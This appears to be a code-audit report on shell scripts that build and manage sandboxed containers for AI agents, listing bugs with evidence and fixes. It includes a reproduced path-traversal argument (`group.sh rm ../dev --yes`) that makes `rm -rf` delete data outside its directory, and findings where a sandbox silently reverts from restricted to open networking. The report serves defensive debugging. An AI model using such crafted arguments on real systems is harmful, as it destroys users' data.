- Fix direction: `cd /` (not `$HOME`, which in the host group may hold its own pin) at the top of agent-tools-reconcile.sh, or at least around the probe and the uv calls.

### RT-5: the leftover-npm-Claude fallback cannot fire in any named group, and its test models a state that cannot occur
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `agent-tools-reconcile.sh: \`! -d "$HOME/.local/share/claude" && -x "$npm_bin/claude"\``; `sandbox.sh: \`"$group_root/.local/share/claude" "$group_root/.local/state/claude"\`` (`install -d`, then mounted)
- Introduced: 2354abc (before the window). 33c2b44 in the window edited the condition.
- What's wrong: for every non-host group with claude-code ON, sandbox.sh creates and mounts `~/.local/share/claude`. So `! -d` is always false in the container, even when the native install failed. `~/.local/bin/claude` is then never pointed at the leftover npm copy, although the comment says "Claude Code plugins expect ~/.local/bin/claude". `/usr/local/bin/claude` still works through `link-agent-tools.sh`'s own fallback.
- Failure scenario: an old group carries npm Claude, and the native install fails (offline, or claude.ai unreachable). There is no `~/.local/bin/claude`, and plugins and hooks that call that path fail. `tests/test-agent-tools-reconcile.sh`'s "leftover npm claude is used" case passes only because it never creates the mounted directory that sandbox.sh always creates.
- Fix direction: key the condition on "no executable version under `~/.local/share/claude/versions`", the same predicate `install_claude_native` uses, and pre-create the directory in the test.

### RT-6: Copilot and Gemini run under whichever node is active, so `nvm use 20` can break them
- Severity: LOW — Confidence: PLAUSIBLE (based on the upstream `engines` minimums; not run)
- Location: `link-agent-tools.sh: \`"copilot:copilot:$home_root/npm/bin/copilot"\`` (a plain symlink to npm's `#!/usr/bin/env node` launcher)
- Introduced: 23e6ad6 / 33c2b44
- What's wrong: 259aeb7 in the window fixed this class for qmd: it pins qmd to the default node because `nvm use 20` cannot run it. The npm-installed agent CLIs were left as plain symlinks. Copilot CLI requires Node 22 or later.
- Failure scenario: a project with `node=20` runs `nvm use 20` in its shell, then `copilot`. It runs on node 20 and refuses to start, or crashes.
- Fix direction: write a wrapper for the npm agent CLIs that runs them under the node they were installed with, the same way link-node-globals.sh `--pin` does for qmd.

### RT-7: updating Codex/Gemini on every start rewrites a package that sibling containers may be running
- Severity: LOW — Confidence: PLAUSIBLE
- Location: `agent-tools-reconcile.sh: \`update_npm()\``
- What's wrong: flock serialises only the reconcile scripts, not the tools themselves. The leftover-Claude comment refuses to delete the npm copy because "other containers in the same group may be running against it right now". Yet `npm install -g --prefix ~/.ai-tools/npm @google/gemini-cli` re-extracts the package in place on every start of any container in the group.
- Failure scenario: Gemini is running in container A. Container B in the same group starts and replaces `lib/node_modules/@google/gemini-cli`, and a module A's node process loads lazily mid-replacement is missing or a different version.
- Fix direction: skip the reinstall when the installed version already equals `npm view <pkg> version`, which also saves the ~7 s per start. Otherwise accept the risk and document it.


## 4. Host lifecycle scripts

### PRJ-1: `group.sh rm` never validates the group name, so `rm -rf` reaches outside `~/.ai-containers`
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `group.sh: \`cmd_rm()\`` (`local dir="$groups_root/$name"` … `rm -rf "$dir"`)
- Introduced: pre-window (group.sh creation). The window touched group.sh through sandbox-common (c029d8a).
- What's wrong: every other entry point runs `validate_group_name` (`^[a-z0-9][a-z0-9-]{0,31}$`), but `cmd_rm` only refuses `host` and the empty string. The name is spliced into a path and handed to `rm -rf`, so a name containing `/` or `..` leaves `~/.ai-containers`. The rvm volume name is sanitised separately (`/`→`_`), so even for a near-valid name like `default/` the directory and the volume no longer refer to the same group: the directory is removed and the group's rvm volume is orphaned.
- Failure scenario: `./group.sh rm ../dev --yes` runs `rm -rf ~/.ai-containers/../dev`, which deletes `~/dev`. Without `--yes` the user gets one `[y/N]` prompt showing an unnormalised path (`…/.ai-containers/../dev`). The only safety is that `rm` itself refuses a path whose last component is `.` or `..`.
- Evidence: reproduced with a fake HOME: `HOME=$S/home bash group.sh rm ../victim --yes` printed `Removed directory …/home/.ai-containers/../victim`, and `$S/home/victim` (with its data) was gone.
- Fix direction: call `validate_group_name "$name"` (or `valid_group_name`, which returns instead of exiting) at the top of `cmd_rm`, before any path is built.

### PRJ-2: Sync re-enables a component the project turned off by commenting it out, as sandbox.conf tells users to do
- **Duplicate of DOC-1** — two reviewers found it independently; fix once (batch 4).
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sync-to-projects.sh: \`reconcile_sandbox_conf()\`` (`grep -qE "^${key}=" "$project" 2>/dev/null || added+=("$key")`)
- Introduced: pre-window reconcile design (24e093a era). 0c7a870 in the window reworked the same append path.
- What's wrong: the header of sandbox.conf says "Boolean components: set to ON to include, OFF (or comment out) to exclude." The reconcile decides that a key is missing when no line starts with `key=`. A commented-out `#copilot=ON` therefore counts as missing, and the key is appended with the upstream default. Upstream ships `copilot=ON`, `claude-code=ON`, `github-cli=ON` and `bun=ON`.
- Failure scenario: a project disables Copilot the documented way (`#copilot=ON`). The next `./sync-to-projects.sh` appends `copilot=ON` under "New options synced from upstream". The next build installs Copilot again, adds its allowlist fragment (`github-copilot.txt`) to the restricted-mode allowlist, and mounts `~/.copilot`. The only output is a one-line "appended 2 new key(s)" message.
- Evidence: reproduced: a project sandbox.conf with `#copilot=ON` and `# claude-code=ON`, then `bash sync-to-projects.sh $P` → `Reconciled sandbox.conf: appended 2 new key(s): copilot claude-code`, and the file now ends with `copilot=ON` and `claude-code=ON`.
- Fix direction: treat a commented `^#[[:space:]]*key=` line as "the project has this key" and do not append it, or write OFF for it. Separately, drop "or comment out" from the sandbox.conf header.

### PRJ-3: Re-running project-init.sh silently resets `SANDBOX_MODE` (restricted → open) and `SANDBOX_WORKDIR`, with no backup
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `project-init.sh: \`SANDBOX_MODE=open\`` in the unconditional `} > "${dest}/sandbox.env"` heredoc. The comment beside it reads `unlike sandbox.env (whose values are all re-prompted)`.
- Introduced: 8555b1d / 3853c17 (pre-window). project-init.sh was touched in the window (9e67226, aeb218a, f8414ab).
- What's wrong: on re-init, sandbox.env is overwritten unconditionally. `SANDBOX_MODE` and `SANDBOX_WORKDIR` are never prompted; they are hardcoded to `open` and `..`. Any other key a user added (`PREVIEW_PORTS`, `SELINUX_LABEL`, `CONTAINER_NOFILE`, …) is also dropped. sandbox.local.env gets a `.pre-init` backup for exactly this reason, but sandbox.env gets none, so the code comment's justification is false. In the default layout `.ai-containers/` is gitignored, so `git status` shows nothing either.
- Failure scenario: a project's sandbox.env has `SANDBOX_MODE=restricted` and `SANDBOX_WORKDIR=@app`. The user re-runs `project-init.sh` and accepts every default (for example, to pick a different group). The next `./runme.sh` launches in **open** mode: unrestricted egress and no firewall, with the primary mount changed. Nothing reports the change.
- Evidence: reproduced: piped answers into a re-init of a project whose sandbox.env held `SANDBOX_MODE=restricted`, `SANDBOX_WORKDIR=@app` and `SELINUX_LABEL=keep`. Afterwards the file held `SANDBOX_MODE=open` and `SANDBOX_WORKDIR=..`, `SELINUX_LABEL` was gone, and no backup existed.
- Fix direction: when sandbox.env already exists, keep its existing `SANDBOX_MODE`/`SANDBOX_WORKDIR`, offer them as prompt defaults, and carry unknown keys forward. At minimum, back it up as is done for sandbox.local.env.

### PRJ-4: project-init.sh adds `/.ai-containers/` to `.gitignore` even in a project that tracks `.ai-containers/`
- Severity: LOW — Confidence: CONFIRMED
- Location: `project-init.sh: \`ensure_ai_containers_ignored()\``. Compare with the same-named function in sync-to-projects.sh, which has `git -C "$project_path" ls-files -- .ai-containers`.
- Introduced: 78a6175 added the tracked-layout guard to sync only (pre-window).
- What's wrong: the two copies of the function have drifted. Sync never adds the ignore rule when any file under `.ai-containers/` is tracked; init still does. In a project that deliberately versions its `.ai-containers/` (the layout AGENTS.md documents: "Remove the line to version the portable config"), re-running init adds the rule back. Every file that is not yet tracked is then hidden from `git add`, which is what the sync-side guard exists to prevent.
- Evidence: reproduced: a git project with `.ai-containers/sandbox.env` committed, then re-init. `git status` showed `?? .gitignore` containing `/.ai-containers/`.
- Fix direction: keep one copy of the function, with the `ls-files` guard, in a sourced file, or add the guard to project-init's copy.

### PRJ-5: Repo/rvm volume discovery uses unanchored Docker `name=` filters; `rm`, `reset` and `gc` delete volumes belonging to other repos or prefixes
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sandbox-common.sh: \`repo_workcopy_volumes()\``, `sandbox-common.sh: \`repo_base_volumes()\``, `sandbox-common.sh: \`rvm_volumes()\``, `repo.sh: \`cmd_rm()\`` / `repo.sh: \`reset_one()\`` (`docker volume ls --quiet --filter "name=${vol}--wc-"`)
- Introduced: pre-window (label/registry design). These paths are called by the window's reset/rm code.
- What's wrong: Docker's volume `name=` filter is an unanchored regex. There are two consequences.
  - (a) `validate_repo_name` allows `--`, so a repo named `app--wc-ui` has the base volume `ai-containers-repo-app--wc-ui`. That volume matches the working-copy filter for repo `app`. `repo.sh rm app`, `repo.sh reset app` (which removes working copies without listing them in the prompt) and `repo.sh gc` all delete it as if it were a working copy. `repo_base_volumes` also hides it from `list`/`reindex` (`grep -v -- '--wc-'`).
  - (b) With `REPO_VOLUME_PREFIX`, which the docs suggest setting to `$IMAGE_NAME`, the prefix `prj` matches `myprj-repo-*`. `gc` under one prefix therefore deletes another prefix's working copies, and `list`/`reindex` adopt another prefix's base volumes. A prefix containing `.` (which sanitising allows) matches any character. `rvm_volumes` has the same shape, and `group.sh gc` deletes what it finds.
- Failure scenario: `REPO_VOLUME_PREFIX=prj ./repo.sh gc --yes` removed `myprj-repo-lib--wc-t`, a working copy that "may hold UNCOMMITTED work" belonging to the other prefix. `./repo.sh rm app --yes` removed the base volume of the separately registered repo `app--wc-ui`, which `list` then reported as MISSING.
- Evidence: reproduced both against the real daemon (Docker 29.7.2) using scratch volumes, which were removed afterwards.
- Fix direction: anchor the filters (`name=^${prefix}-repo-`, `name=^${vol}--wc-`), then confirm each result by its labels or an exact prefix match in bash. Forbid `--` in repo names, or use a working-copy separator that `validate_repo_name` cannot produce.

### PRJ-6: ai-containers-report.sh reads the LAST value of a key, but the launcher uses the FIRST, so the network mode can be misreported
- Severity: LOW — Confidence: CONFIRMED
- Location: `ai-containers-report.sh: \`env_var()\`` (`END { if (val != "") print val }`, last match wins) vs `sandbox-common.sh: \`load_env_defaults()\`` (`[[ -n "${!key+x}" ]] && continue`, first match wins within a file)
- Introduced: pre-window. AGENTS.md says the report resolves "the same precedence sandbox-common.sh applies".
- What's wrong: when a key appears twice in sandbox.env, the report and the launcher disagree. The natural way to override `SANDBOX_MODE=open`, which project-init writes, is to append a line, and that triggers it. The report also strips a trailing `# comment` and single quotes, which the launcher treats as part of the value. It also labels an unset mode `DEFAULT-OPEN`, but sandbox.sh falls back to `usage` (`command="${1:-${SANDBOX_MODE:-usage}}"`) and does not launch at all.
- Failure scenario: sandbox.env contains `SANDBOX_MODE=open` and later `SANDBOX_MODE=restricted`. The report shows `RESTRICTED`; the launcher runs **open**.
- Evidence: reproduced: the report printed `RESTRICTED`, and the same file loaded through `load_env_defaults` gave `SANDBOX_MODE=open`.
- Fix direction: make `env_var` keep the first match and the same literal value semantics as `load_env_defaults`, and replace `DEFAULT-OPEN` with something like `UNSET (usage)`.

### PRJ-7: The `repo.sh gc` tests fail under glibc `en_US.UTF-8`; this is a test bug, not a product bug
- **Duplicate of TST-1** (which also covers the second affected test, `tests/test-falsify-run.sh`); fix once (batch 7).
- Severity: LOW — Confidence: CONFIRMED
- Location: `tests/test-repo-destructive.sh: \`removed() { sed -n 's/^volume rm //p' "$DOCKER_LOG" | tr ' ' '\n' | grep -v '^--' | sort | tr '\n' '|'; }\``
- What's wrong: the helper sorts with the caller's locale, but the expected strings are hand-written in byte (C) order. glibc's en_US.UTF-8 ignores punctuation at the primary level, so `docs-archive--wc-projA` sorts before `docs--wc-projA`. The product does not depend on order: gc removes in docker's listing order, and the report and list sorts use `LC_ALL=C`. All other tests in this area pass under en_US.UTF-8.
- Evidence: `LC_ALL=en_US.UTF-8 bash tests/test-repo-destructive.sh` → rc=2, `FAIL: gc --yes removes every working copy…` and `FAIL: gc --unused keeps the in-use copy…`. Under C.UTF-8 it passes.
- Fix direction: `LC_ALL=C sort` in `removed()`, and in the `sort -u` near the end of the same file.

### PRJ-8: Migration 002 writes a major-only `openjdk=21`, which build.sh then refuses
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `migrations/002-openjdk-single-key.sh: \`printf 'openjdk=%s\n' "$merged"\`` vs `build.sh` (`looks like a major version only`)
- Introduced: 24e093a (pre-window).
- What's wrong: `openjdk-21=ON` is migrated to `openjdk=21`. build.sh's validate_config rejects any SDKMAN version without a `.`, so the first build after a sync fails. The error is clear but the migration itself caused it. Old code, and it only affects projects that predate the openjdk split.
- Fix direction: have the hook map each major to a full identifier or emit an empty value plus a comment, or have it print a notice that the value must be completed.

### PRJ-9: Timestamped `*.pre-migrate.<ts>` backups are not gitignored
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `migrate-runme.sh: \`bk="${f}.pre-migrate.$(date -u +%Y%m%dT%H%M%SZ)"\`` vs the ignore pattern `'*.pre-migrate'` in project-init.sh and `sync-to-projects.sh: \`ensure_inner_gitignore()\``
- What's wrong: the `.pre-init` backups have a wildcard pattern (`sandbox.local.env.pre-init*`); the second-generation `.pre-migrate.<ts>` backups do not. Those backups include `sandbox.local.env.pre-migrate.<ts>` (this machine's absolute mount paths) and the old fat runme.sh. In a project that tracks `.ai-containers/`, they show up as committable.
- Fix direction: add `*.pre-migrate.*` (or change the pattern to `*.pre-migrate*`) in both places.


## 5. In-container DB services

### SVC-1: The MySQL/MariaDB admin client obeys the app's `MYSQL_HOST` / `MYSQL_TCP_PORT` / `MYSQL_PWD` from container.env, so the start fails or the admin SQL goes to another server
- Severity: MEDIUM — Confidence: CONFIRMED (client behaviour reproduced; the adapter consequence follows from the code)
- Location: `services.d/mysql.sh: _mysql_sql()` (`"$MYSQL_CLIENT" --no-defaults -uroot --socket="$(_mysql_sock)" -e "$1"`), `services.d/mariadb.sh: _mariadb_pid_file()` (same flags)
- Introduced: bc86420 (mysql), b058bed (mariadb)
- What's wrong: The adapters keep their own knobs under `AI_SERVICES_MYSQL_*` / `AI_SERVICES_MARIADB_*` so that the app's variables cannot move the server (AGENTS.md; mutations 794/813 test `MYSQL_PORT`). The clients the adapters run, though, read the environment themselves, and `start` gets all of container.env. `--no-defaults` turns off option files only, not environment variables. The client calls pass `--socket` but no `-h`/`--protocol`, so a `MYSQL_HOST` in the environment switches the connection to TCP to that host, ignoring `--socket`. `MYSQL_TCP_PORT` then picks the port, and `MYSQL_PWD` sends a password that root, which has none, rejects.
- Failure scenario: a `container.env` copied from a docker-compose setup with `MYSQL_HOST=db`, or the leftover `MYSQL_HOST=host.docker.internal` that docs/components/mysql.md itself anticipates ("Moving from a database on the host?"):
  - mysql: `mysqld --daemonize` succeeds, then `_mysql_create_self` fails (`ERROR 2005 Unknown MySQL server host 'db'`), so `svc_start` returns 1. The runner prints "mysql failed to start", but the server is in fact running, and `MYSQL_USERS`/`MYSQL_DATABASES` are never provisioned.
  - mariadb: `_mariadb_pid_file` never matches, so the loop spins for the full 30 s and then reports "mariadbd did not answer". The server keeps running anyway (nothing kills it on that path).
  - In open/discovery mode with `MYSQL_HOST=host.docker.internal`, `CREATE USER … GRANT ALL … WITH GRANT OPTION` and `ALTER USER 'root'@'localhost' IDENTIFIED BY …` are sent to the host's real MySQL as root. They succeed only if that root takes TCP logins with no password, which is unlikely but the wrong target either way.
- Evidence (in `ubuntu:24.04` with `mysql-client-core-8.0`, and again with `mariadb-client-core`):
  ```
  mysql --no-defaults -uroot --socket=/tmp/x.sock -e "select 1"                  → ERROR 2002 Can't connect … through socket '/tmp/x.sock'
  MYSQL_HOST=db mysql --no-defaults -uroot --socket=/tmp/x.sock …                 → ERROR 2005 Unknown MySQL server host 'db'
  MYSQL_HOST=127.0.0.1 MYSQL_TCP_PORT=3307 mysql --no-defaults -uroot --socket=…  → ERROR 2003 Can't connect to MySQL server on '127.0.0.1:3307'
  MYSQL_HOST=db mariadb --no-defaults -uroot --socket=/tmp/x.sock -N -B -e …      → ERROR 2005 Unknown server host 'db'
  ```
- The same class, not reproduced, lower likelihood:
  - `REDISCLI_AUTH` makes `redis-cli` in `services.d/redis.sh: _redis_info_pid()` send AUTH to a server with no password. Redis 7 refuses that, so readiness never passes and the start fails after 30 s.
  - `PGHOSTADDR` overrides psql's `-h <socket dir>` in `_pg_sql()` and connects over TCP to that address.
- Fix direction: run the adapters' client calls under `env -u MYSQL_HOST -u MYSQL_TCP_PORT -u MYSQL_PWD -u MYSQL_UNIX_PORT` and add `--protocol=SOCKET`. Do the same for `REDISCLI_AUTH` (redis-cli) and `PGHOSTADDR`/`PGSERVICE` (psql). Add a hermetic test that sets `MYSQL_HOST` and checks that the fake client's argv/env still targets the socket.

### SVC-2: On an x86-64 CPU without AVX, mongo is reported as "this image has no mongo server. Rebuild", not as a start failure with the log
- Confirmation needs non-AVX hardware: tracked as PLAT-4 in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md). The hermetic half of the fix can be done in batch 5.
- Severity: LOW — Confidence: PLAUSIBLE (not reproduced; needs a non-AVX CPU, e.g. a Proxmox/KVM guest with the `kvm64` CPU type)
- Location: `services.d/mongo.sh: svc_installed_version()` (`"$MONGO_MONGOD" --version 2>/dev/null | sed -n …`), together with `start-services.sh: start_one()` (`warn "sandbox.conf has $name=$value, but this image has no $name server. Rebuild: ./build.sh"`)
- Introduced: e3c9b15
- What's wrong: docs/components/mongo.md says: "a CPU or an emulator without it stops `mongod` with `Illegal instruction`, and the start says it failed, with the log." MongoDB ≥5.0's x86-64 binaries die with SIGILL during early start-up, and that includes `mongod --version`. The version probe therefore prints nothing, and the runner takes an empty version to mean "not installed".
- Failure scenario: `mongo=ON`, the image is built and run on a non-AVX host. The user sees the "Rebuild: ./build.sh" warning, rebuilds, and gets the same warning. No log is written and no SIGILL is mentioned anywhere.
- Fix direction: decide "installed" by `[[ -x "$MONGO_MONGOD" ]]`, and if the version probe then fails, report it (for example "mongod exists but cannot run: exit 132 (Illegal instruction — needs AVX)"). Alternatively, correct the doc.

### SVC-3: Empty entries in `POSTGRES_ROLES` / `POSTGRES_DATABASES` warn about `''`
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `services.d/postgres.sh: svc_provision()`. Neither loop has an empty-entry skip; mysql.sh has `[[ -n "$entry" ]] || continue`.
- Introduced: d337c61 / d7cdb75
- What's wrong: `a,,b`, or a trailing `, ` (the `IFS=, read -ra` split keeps a whitespace-only last field), produces an empty name, which then fails the regex and is warned about. The MySQL adapter skips empties silently, and so does the runner's own `each_service` for `AI_SERVICES`.
- Evidence: `POSTGRES_ROLES='app_user,,other' POSTGRES_DATABASES='db1, '` against the adapter with a fake psql printed:
  ```
  WARNING: POSTGRES_ROLES: '' is not a valid role name (lowercase letters, digits, _) — skipped
  WARNING: POSTGRES_DATABASES: '' is not name or name:owner (lowercase letters, digits, _) — skipped
  ; roles: app_user, other; databases: db1
  ```
- Fix direction: add `[[ -n "$name" ]] || continue` (and the same on the trimmed entry) to both loops, as mysql.sh does.


## 6. Build, Dockerfile, tools.d and config validation

### BLD-1: db-clients=mongo layer can fail and still report a successful build
- Severity: MEDIUM — Confidence: CONFIRMED (shell semantics reproduced; not run in a docker build). **Triage correction:** the failure is silent only when a step *before* the final `apt-get install` fails (key fetch, `gpg --dearmor`, writing the list). The final `apt-get install` is the last command of the `&&` list, so `set -e` does stop on it: an "Unable to locate package" after a plain `apt-get update` that ignored a broken repo **does** fail the build. The fix direction is unchanged.
- Location: `Dockerfile: \`apt-get update && apt-get install -y --no-install-recommends mongodb-mongosh ;;\`` (DB_CLIENTS layer)
- Introduced: 286790e (pre-window). The window touched the neighbouring mongo work (e3c9b15) without fixing it.
- What's wrong: The `mongo)` arm is one `&&` list: `curl … | gpg --dearmor … && echo … > list && apt-get update && apt-get install … mongodb-mongosh`. Under `set -e`, bash ignores a failure anywhere in an `&&` list except the last command. The list also sits inside a `for`/`case`, and `; done; rm -rf /var/lib/apt/lists/*;` runs after it. So the layer's exit status is the `rm`'s, which is 0. The pg and mysql arms are single simple commands, so `-e` does stop on those.
- Failure scenario: `db-clients=mongo`, and any step of the arm fails. Examples: pgp.mongodb.com still failing after 5 retries, a gpg error, or repo.mongodb.org not loading. Plain `apt-get update` exits 0 when that happens, and the next `apt-get install` fails with "Unable to locate package". Every one of these ends with `docker build` succeeding, an image with no `mongosh`, and the build toolchain still kept. The `mongo=` server layer just below uses `--error-on=any` and `test -x /usr/bin/mongosh` to fail closed in exactly this situation.
- Evidence: `bash -euo pipefail -c 'for c in mongo; do case "$c" in mongo) false | cat && echo next ;; esac; done; echo "REACHED rm"'` prints `REACHED rm` and exits 0.
- Fix direction: Make the arm fail the layer, either `( … ) || exit 1` around it or `… || { echo "mongosh install failed" >&2; exit 1; }`. Also add `--error-on=any` and a final `test -x /usr/bin/mongosh`, as the server layer does.

### BLD-2: SDKMAN multi-version installs: a bad version that is not last is silently skipped
- Severity: MEDIUM — Confidence: PLAUSIBLE (loop semantics reproduced; `sdk install`'s exit code on an unknown version not run here)
- Location: `Dockerfile: \`for ver in $OPENJDK_VERSIONS; do sdk install java \${ver}-tem; done"\`` (the same pattern is in the graalce, graal, kotlin, scala, maven and gradle layers)
- Introduced: 8c4bd08 (pre-window, untouched ancient code)
- What's wrong: Each loop runs inside a nested `bash -c "…"`. That child bash does not inherit the Dockerfile `SHELL`'s `-e`, so the loop's status is the status of its last iteration. `validate_config` only checks that each version contains a `.`.
- Failure scenario: `openjdk=21.0.5,17.0.99` (a typo in a version that is not first), or `maven=3.9.9,3.9.99`. The bad `sdk install` prints "Stop! … is not available" and returns non-zero. The next iteration succeeds, the layer is green, and the image lacks the version `sandbox.conf` asked for. A bad *first* openjdk/graal version is caught only by accident, by the later `sdk default java <first>`. A bad version for kotlin/scala/maven/gradle is caught only when it is the last in the list.
- Evidence: `bash -euo pipefail -c 'bash -c "for v in bad good; do [ \$v = good ]; done" && echo "layer would succeed"'` prints `layer would succeed`.
- Fix direction: Use `bash -ec "…"`, or `sdk install … || exit 1` inside each loop.

### BLD-3: install=repo-file installs the binary as mode 0711 (not readable by the agent)
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`if ! mv "$tmp" "$dest" || ! chmod +x "$dest"; then\`` in `install_repo_file()`
- Introduced: in the window, with the repo-file install path
- What's wrong: `tmp` comes from `mktemp`, which creates the file 0600. `mv` keeps that mode, and `chmod +x` under umask 022 only adds the x bits, giving 0711. The sandbox user, who is not root, can execute an ELF file at that mode but cannot read it. A script binary (shell, Python zipapp) fails with `Permission denied`, and `file`, `sha256sum` and copying the binary also fail. `install_url` gets 0755 only because curl creates its file under the umask. This is latent in this repo, which ships no repo-file tool, but live in the mgd port (acli-pii is install=repo-file). `tests/test-tools-d.sh` checks only `-x` as the owner, so it cannot see the problem.
- Evidence: fake curl plus `TOOL_VERSIONS=pub=latest` with an `install=repo-file` descriptor → `stat -c %a` on the installed binary prints `711`.
- Fix direction: `chmod 0755 "$dest"` (or use `install -m 0755`). Add a test that asserts the other-read bit is set.

### BLD-4: Private release path still falls back to an anonymous API request with a stale token
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`if [ -z "$body" ] && [ -n "${AUTH_ARGS[*]+set}" ] && [ "${#AUTH_ARGS[@]}" -gt 0 ]; then\`` in `api_get()`, called from the `private=yes` branch of `install_one()`
- Introduced: in the window (anonymous fallback in aa662ad; c4abf76 fixed only `install_repo_file`)
- What's wrong: The file's own rule says "ONLY WHERE THE TOKEN IS OPTIONAL … the private release-asset path therefore has no fallback". c4abf76 applied that rule to repo-file. `api_get` still makes the anonymous retry for every caller, including private release resolution.
- Failure scenario: a `private=yes` release tool with a stale or un-SSO'd token. There are 3 authenticated attempts, then one anonymous request that cannot succeed. The build then prints "API request failed with a credential; retrying anonymously (is GITHUB_TOKEN stale?)", which is the misleading diagnostic c4abf76 removed elsewhere.
- Evidence: fake curl that always fails, descriptor `repo=acme/secret private=yes`, `GITHUB_TOKEN=stale`. The call log shows 3 calls with `Authorization` and a 4th without it.
- Fix direction: Pass a "no anonymous fallback" flag to `api_get` from the private branch, or check `TOOL_private` inside it.

### BLD-5: AGENTS.md says a pinned acli value is "refused"; it is installed as latest with a NOTE
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`echo "NOTE: ${name}=${version} cannot be pinned: its url= has no \${VERSION} placeholder." >&2\``; `build.sh: \`tool_versions_arg()\``; AGENTS.md: "so its grammar is `ON | OFF` and a pinned value is refused rather than silently ignored"
- What's wrong: Nothing refuses the value. `validate_config` has no tools.d check, and `tool_versions_arg` passes `acli=1.3.22` through. `install_url` prints a NOTE that is easy to miss in the build log, then installs whatever `/latest/` currently serves. A user who reads AGENTS.md will think a pin was either honoured or rejected.
- Evidence: `sandbox.conf` with `acli=1.3.22` → `validate_config` passes and `tool_versions_arg` → `acli=1.3.22;…`.
- Fix direction: Refuse a non-ON/OFF value in `validate_config` for a tool whose `url=` has no `${VERSION}` (and whose install is not release), or correct AGENTS.md to describe the NOTE behaviour.

### BLD-6: A lowercase `off`/`on` passes validation for most keys; `ruby=off` brings back the exact ruby=OFF defect
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `sandbox-common.sh: \`has_versions()\`` / `version_list()` (they normalise only the literal `OFF`); `build.sh: \`validate_config()\`` (case-checks only playwright and the server keys)
- What's wrong: The OFF normalisation compares against the literal `OFF`, and `validate_config` adds case checks only for playwright, postgres, redis, mysql, mongo and mariadb.
- Failure scenario:
  - `ruby=off`: `has_versions ruby` is true. That gives KEEP_BUILD_TOOLCHAIN=1, RUBY_RUNTIME=1, `RUBY_VERSIONS=off` in the container and an rvm volume, and `rvm install off` fails on every start. This is exactly the failure AGENTS.md describes for `ruby=OFF`.
  - `dtctl=on`: `TOOL_VERSIONS=dtctl=on`, then download tag `von`, a non-fatal WARNING, and an image without dtctl.
  - `c-toolchain=on`: silently OFF.
  - rust, go, node and python with `off` fail the build loudly, so they cause no silent harm.
- Evidence: `sandbox.conf` with `ruby=off dtctl=on c-toolchain=on` → `validate_config` passes, `tool_versions_arg` prints `dtctl=on`, `is_enabled c-toolchain` is false, and `version_list ruby` prints `off`.
- Fix direction: Apply the playwright-style "must be written in capitals" check generically to every key whose value case-folds to ON/OFF.

### BLD-7: AGENTS.md says rust and go accept comma-separated version lists; they accept one value
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: AGENTS.md: "Version-list components (`node`, `python`, `ruby`, `rust`, `go`) accept comma-separated version values"; `build.sh: \`_args+=(--build-arg "GO_VERSION=$ver")\`` and `RUST_TOOLCHAIN=$ver`
- What's wrong: Neither value is split. `go=1.24.2,1.23.1` produces `https://go.dev/dl/go1.24.2,1.23.1.linux-amd64.tar.gz`, a 404. `rust=stable,nightly` gives `rustup --default-toolchain "stable,nightly"`. `validate_config` does not reject the comma, as it does for angular-cli and playwright. `sandbox.conf`'s own comments describe a single value.
- Failure scenario: a user follows AGENTS.md and the build fails with an error that names a strange URL rather than the key.
- Fix direction: Correct AGENTS.md, and add a comma refusal for rust and go in `validate_config`.


## 7. Test harness and CI

### TST-1: Hermetic suite fails on a developer host with an en_US.UTF-8 locale (two tests compare a locale `sort` against C-ordered literals)
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `tests/test-repo-destructive.sh: \`removed() { sed -n 's/^volume rm //p' "$DOCKER_LOG" | tr ' ' '\n' | grep -v '^--' | sort | tr '\n' '|'; }\``; `tests/test-falsify-run.sh: \`find "$FR_WORK/w0" -type f 2>/dev/null | sed "s|^$FR_WORK/w0/||" | sort | tr '\n' ' ' )"\``
- Introduced: 92c40dd / 8b9ad30 (2026-08-20/21, test-repo-destructive); the test-falsify-run.sh assertion is in the same class.
- What's wrong: both helpers pipe through a bare `sort`, which follows LC_COLLATE. The expected strings are written in byte (C) order. In en_US.UTF-8, glibc ignores punctuation at the first collation level, so `docs-archive--wc` sorts before `docs--wc` and `a/file1` sorts before `.github/…`. Nothing pins the locale: neither run-all.sh nor the two tests sets LC_ALL. GitHub runners use C.UTF-8, so CI stays green.
- This is a test bug, not a product bug. `repo.sh: \`cmd_gc()\`` removes the same set of volumes either way, and the order has no meaning.
- Failure scenario: on a typical Linux desktop (LANG=en_US.UTF-8), `bash ./verify-on-host.sh` Phase 5 reports "hermetic suite exited 1". Because the symlinked-TMPDIR arm is gated on `h_rc == 0`, that arm then does not run at all.
- Evidence:
  ```
  LC_ALL=en_US.UTF-8 bash tests/run-all.sh repo-destructive
  FAIL: gc --yes removes every working copy, across all repos (expected 'ai-containers-repo-docs--wc-projA|ai-containers-repo-docs--wc-projB|ai-containers-repo-docs-archive--wc-projA|', got 'ai-containers-repo-docs-archive--wc-projA|ai-containers-repo-docs--wc-projA|ai-containers-repo-docs--wc-projB|')
  FAIL: gc --unused keeps the in-use copy …
  full suite under en_US.UTF-8: 98 test(s), 96 passed, 2 failed — test-falsify-run.sh: "a partial cp -a does not nest the seeded tree (expected '.github/workflows/nightly.yml a/file1 ', got 'a/file1 .github/workflows/nightly.yml ')"
  ```
  With LC_ALL=C and with C.UTF-8 both tests pass.
- Fix direction: use `LC_ALL=C sort` in both helpers. Optionally also export `LC_ALL=C` (or `LC_COLLATE=C`) per test in run-all.sh, and add a run under a non-C locale to the suite so the class stays caught.

### TST-2: Layer-containment models nightly wrongly — a PR-selected case that no nightly job runs still passes "PR ⊆ nightly"
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
